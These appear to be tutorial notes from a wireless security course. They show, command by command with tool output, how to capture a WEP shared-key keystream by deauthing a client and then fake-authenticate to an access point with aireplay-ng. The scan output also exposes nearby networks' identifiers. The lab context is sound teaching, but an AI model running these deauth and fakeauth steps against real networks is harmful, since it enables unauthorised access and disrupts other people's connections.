#### Part 8: Hacking WLAN Authentication

Before connecting the Alfa card

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 51830  bytes 3435415 (3.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 47066  bytes 33321752 (31.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 248  bytes 12512 (12.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 248  bytes 12512 (12.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~#
```	
	
Connect the Alfa card

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 113  bytes 13062 (12.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 116  bytes 19058 (18.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# ifconfig -a
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 124  bytes 13940 (13.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 123  bytes 20732 (20.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4098<BROADCAST,MULTICAST>  mtu 1500
        ether 00:c0:ca:92:3c:89  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# ifconfig wlan0 up
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 377  bytes 30254 (29.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 169  bytes 26425 (25.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether ae:ac:75:a7:71:b2  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~#
```

Put the card in monitor mode

```sh
root@kali:~# airmon-ng

PHY	Interface	Driver		Chipset

phy1	wlan0		rtl8187		Realtek Semiconductor Corp. RTL8187

root@kali:~# airmon-ng start wlan0

Found 3 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to run 'airmon-ng check kill'

  PID Name
  400 NetworkManager
  569 dhclient
  804 wpa_supplicant

PHY	Interface	Driver		Chipset

phy1	wlan0		rtl8187		Realtek Semiconductor Corp. RTL8187

		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)

root@kali:~# airmon-ng

PHY	Interface	Driver		Chipset

phy1	wlan0mon	rtl8187		Realtek Semiconductor Corp. RTL8187

root@kali:~#
```

Check for the monitor mode interface

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 518  bytes 40324 (39.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 236  bytes 35799 (34.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0mon: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 00-C0-CA-92-3C-89-30-30-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 858  bytes 151521 (147.9 KiB)
        RX errors 0  dropped 858  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# iwconfig
lo        no wireless extensions.

eth0      no wireless extensions.

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

root@kali:~#
```

Identify channel of AP

```sh
root@kali:~# airodump-ng wlan0mon

 CH  3 ][ Elapsed: 0 s ][ 2017-06-05 14:11

 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 78:F2:9E:D2:F3:39  -49        2        0    0   6  54e. WPA2 CCMP   PSK  <length:  0>
 78:F2:9E:D2:F3:3A  -36        3        0    0   6  54e. OPN              xfinitywifi
 B0:7F:B9:2A:4F:BB  -60        2        0    0  11  54e  WPA2 CCMP   PSK  kukikikukiki
 34:1F:E4:E5:52:91  -47        2        0    0  11  54e. WPA2 CCMP   PSK  Lowspeed
 C4:04:15:3A:8B:30  -46        2        1    0  11  54e  WPA2 CCMP   PSK  NETGEAR43
 46:1F:E4:E5:52:91  -57        3        0    0  11  54e. OPN              xfinitywifi
 34:97:F6:08:DB:18  -31        2        1    0   9  54e  WPA2 CCMP   PSK  IZZY
 A0:63:91:4B:42:82  -45        3        1    0   3  54e  WPA2 CCMP   PSK  NETGEAR91
 C2:3F:B4:87:66:10  -58        2        0    0   1  54e  WPA2 CCMP   PSK  <length:  0>
 84:C9:B2:6D:0C:85  -23        5        0    0   4  54e. OPN              dlink
 10:0D:7F:DB:EC:84  -63        1        3    1   1  54e  WPA2 CCMP   PSK  CG3000DV208
 B4:75:0E:20:71:B1  -63        2        0    0   1  54e  OPN              belkin.1ae.guests
 9C:34:26:8A:34:A2  -35        2        0    0   1  54e. WPA2 CCMP   PSK  eeshawifi
 78:F2:9E:D2:F3:38  -29        1        0    0   6  54e. WPA2 CCMP   PSK  HOME-27B0-2.4
 78:F2:9E:D2:F3:3B  -39        4        0    0   6  54e. OPN              <length:  0>
 78:F2:9E:D2:F3:3D  -37        4        0    0   6  54e. WPA2 CCMP   MGT  <length:  0>

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 10:0D:7F:DB:EC:84  B8:3E:59:EF:32:5B   -1    5e- 0      0        3
 (not associated)   80:D2:1D:44:EA:44  -51    0 - 1      0        3  NETGEAR10

root@kali:~#
```

The ```dlink``` AP is on channel 4
<br/>
Put the card on channel 4

```sh
root@kali:~# iwconfig
eth0      no wireless extensions.

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.484 GHz  Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

lo        no wireless extensions.

root@kali:~# iwconfig wlan0mon channel 4
root@kali:~# iwconfig
eth0      no wireless extensions.

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.427 GHz  Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

lo        no wireless extensions.

root@kali:~#
```

Enable WEP
![Image of Config](https://github.com/Kan1shka9/Wireless-LAN-Security-Megaprimer-Notes/blob/master/images/part_8.jpeg)

Identify clients that are connected (make sure at least one client is connected)

```sh
root@kali:~# airodump-ng wlan0mon --essid dlink --channel 4

 CH  4 ][ Elapsed: 6 s ][ 2017-06-05 18:26

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 84:C9:B2:6D:0C:85  -21 100       68      287   72   4  11e. WEP  WEP         dlink

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 (not associated)   FC:3D:93:32:BF:A0  -67    0 - 1      0        1
 (not associated)   78:3A:84:53:22:6B  -57    0 - 1      0        2
 84:C9:B2:6D:0C:85  F4:0F:24:33:5E:D1  -18   11e-11e  1787      153
 84:C9:B2:6D:0C:85  BC:9F:EF:69:35:19  -35   11e-11e  1012      155  HiddenSSID

root@kali:~#
```

The ```AUTH``` value can be ```OPN``` or ```SKA```

Deauth the client because the whole ```SKA``` or ```OPN``` auth has to be captured by ```airodump-ng``` (keep running ```airodump-ng``` in the background) . Also make sure the client connects back to the same AP

```sh
root@kali:~# aireplay-ng --deauth 1 -a 84:C9:B2:6D:0C:85 -h BC:9F:EF:69:35:19 wlan0mon
The interface MAC (00:C0:CA:92:3C:89) doesn't match the specified MAC (-h).
	ifconfig wlan0mon hw ether BC:9F:EF:69:35:19
17:42:42  Waiting for beacon frame (BSSID: 84:C9:B2:6D:0C:85) on channel 4
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
17:42:42  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
root@kali:~#
```

```keystream``` and ```xor``` key successfully extracted

```sh
root@kali:~# airodump-ng wlan0mon --channel 4 --essid dlink --write demo

 CH  4 ][ Elapsed: 3 mins ][ 2017-06-05 17:44 ][ 140 bytes keystream: 84:C9:B2:6D:0C:85

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 84:C9:B2:6D:0C:85  -40  50     1274     1610    0   4  11e. WEP  WEP    SKA  dlink

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 (not associated)   78:3A:84:53:22:6B  -41    0 - 1      0       12
 (not associated)   5C:93:A2:A9:09:33  -56    0 - 1     39        8  CBCI-601B-2.4
 (not associated)   64:80:99:D7:8E:03  -62    0 - 1      0        9  ATT016,Kaiser
 (not associated)   60:F1:89:EA:32:DB  -63    0 - 1      0        3
 (not associated)   6C:AD:F8:60:5C:74  -64    0 - 1      0        6  NETGEAR07
 (not associated)   8E:F7:74:50:69:6A  -65    0 - 1      0        4
 (not associated)   EE:74:A4:CD:24:BC  -67    0 - 1      0        2
 (not associated)   FC:DB:B3:1C:29:97  -67    0 - 1      0       13  HOME-5682,The MaTriX,Dgcguest
 (not associated)   24:77:03:C4:36:FC  -71    0 - 1      0        2  Stronghold5
 (not associated)   84:B5:41:4A:25:5C  -62    0 - 1      0        3
 (not associated)   D0:53:49:2E:39:71  -51    0 - 1      0        7
 84:C9:B2:6D:0C:85  F4:0F:24:33:5E:D1  -19   11e-11e     0      876  dlink
 84:C9:B2:6D:0C:85  BC:9F:EF:69:35:19  -38   11e-11      0      696  dlink

root@kali:~# ls -la demo-01*
-rw-r--r-- 1 root root    144 Jun  5 17:42 demo-01-84-C9-B2-6D-0C-85.xor
-rw-r--r-- 1 root root 563645 Jun  5 17:44 demo-01.cap
-rw-r--r-- 1 root root   3374 Jun  5 17:44 demo-01.csv
-rw-r--r-- 1 root root    580 Jun  5 17:44 demo-01.kismet.csv
-rw-r--r-- 1 root root  34783 Jun  5 17:44 demo-01.kismet.netxml
root@kali:~#
```

Perform a fakeauth with the obtained ```xor``` key

Setup ```airodump-ng```

```sh
root@kali:~# airodump-ng wlan0mon --channel 4 --essid dlink --write fakeauth

 CH  4 ][ Elapsed: 0 s ][ 2017-06-05 18:04

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 84:C9:B2:6D:0C:85  -22   0       22        0    0   4  11e. WEP  WEP         dlink

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

```

```sh
root@kali:~# aireplay-ng --fakeauth 10 wlan0mon -e dlink -y demo-01-84-C9-B2-6D-0C-85.xor
No source MAC (-h) specified. Using the device MAC (00:C0:CA:92:3C:89)
17:50:38  Waiting for beacon frame (ESSID: dlink) on channel 4
Found BSSID "84:C9:B2:6D:0C:85" to given ESSID "dlink".

17:50:38  Sending Authentication Request (Shared Key) [ACK]
17:50:38  Authentication 1/2 successful
17:50:38  Sending encrypted challenge. [ACK]
17:50:38  Authentication 2/2 successful
17:50:38  Sending Association Request [ACK]

```

```airodump-ng``` output

```sh
root@kali:~# airodump-ng wlan0mon --channel 4 --essid dlink --write fakeauth

 CH  4 ][ Elapsed: 6 s ][ 2017-06-05 17:50 ][ 140 bytes keystream: 84:C9:B2:6D:0C:85

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 84:C9:B2:6D:0C:85  -24 100       58        2    0   4  11e. WEP  WEP    SKA  dlink

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 84:C9:B2:6D:0C:85  00:C0:CA:92:3C:89    0    0 - 1      2        6
 84:C9:B2:6D:0C:85  F4:0F:24:33:5E:D1  -13   11e-11e     0        3

root@kali:~# ls -la fakeauth-01*
-rw-r--r-- 1 root root  144 Jun  5 17:50 fakeauth-01-84-C9-B2-6D-0C-85.xor
-rw-r--r-- 1 root root 2153 Jun  5 17:50 fakeauth-01.cap
-rw-r--r-- 1 root root  664 Jun  5 17:50 fakeauth-01.csv
-rw-r--r-- 1 root root  572 Jun  5 17:50 fakeauth-01.kismet.csv
-rw-r--r-- 1 root root 2629 Jun  5 17:50 fakeauth-01.kismet.netxml
root@kali:~#
```
